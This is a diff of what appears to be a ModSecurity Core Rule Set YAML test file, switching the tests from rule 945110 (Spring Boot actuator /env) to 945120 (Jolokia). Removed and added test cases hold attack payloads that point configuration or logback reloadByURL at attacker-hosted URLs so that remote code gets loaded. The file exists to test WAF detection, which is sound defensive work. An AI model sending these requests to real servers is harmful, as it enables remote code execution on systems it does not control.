@@ -2,35 +2,12 @@
   meta:
     author: "Mikhail_Rusakovich"
     enabled: true
-    name: "945110.yaml"
+    name: "945120.yaml"
     description: "Description"
-  tests:
+  tests:              
     -
-      test_title: 945110-1
-      desc: POST attack on env Spring-boot actuator endpoint
-      stages:
-        -
-          stage:
-            input:
-              dest_addr: "127.0.0.1"
-              port: 80
-              headers:
-                Host: "localhost"
-                User-Agent: "ModSecurity CRS 3 Tests"
-                Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
-                Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
-                Accept-Encoding: gzip,deflate
-                Accept-Language: en-us,en;q=0.5
-                Content-Type: "application/x-www-form-urlencoded"
-              method: POST
-              uri: /env
-              version: HTTP/1.1
-              data: "spring.cloud.bootstrap.location=http://attacker.example/yaml-payload.yml"
-            output:
-              log_contains: "id \"945110\""
-    -
-      test_title: 945110-2
-      desc: GET attack on env Spring-boot actuator endpoint
+      test_title: 945120-1
+      desc: Remote Code Execution via jolokia
       stages:
         -
           stage:
@@ -46,13 +23,13 @@
                 Accept-Language: en-us,en;q=0.5
                 Content-Type: "application/x-www-form-urlencoded"
               method: GET
-              uri: /env
+              uri: /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xml
               version: HTTP/1.1
             output:
-              no_log_contains: "id \"945110\""
+              log_contains: "id \"945120\""
     -
-      test_title: 945110-3
-      desc: Post attack on env Spring-boot actuator endpoint 
+      test_title: 945120-2
+      desc: Legitimate request via jolokia
       stages:
         -
           stage:
@@ -67,15 +44,14 @@
                 Accept-Encoding: gzip,deflate
                 Accept-Language: en-us,en;q=0.5
                 Content-Type: "application/x-www-form-urlencoded"
-              method: POST
-              uri: /env
+              method: GET
+              uri: /jolokia/list
               version: HTTP/1.1
-              data: "eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream"
             output:
-              log_contains: "id \"945110\""
+              no_log_contains: "id \"945120\""
     -
-      test_title: 945110-4
-      desc: Legitimate request on env Spring-boot actuator endpoint 
+      test_title: 945120-3
+      desc: Legitimate request via jolokia
       stages:
         -
           stage:
@@ -90,9 +66,8 @@
                 Accept-Encoding: gzip,deflate
                 Accept-Language: en-us,en;q=0.5
                 Content-Type: "application/x-www-form-urlencoded"
-              method: POST
-              uri: /env
+              method: GET
+              uri: /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator
               version: HTTP/1.1
-              data: "legitimate.property=some_legitimate_property_value"
             output:
-              no_log_contains: "id \"945110\""
+              no_log_contains: "id \"945120\""
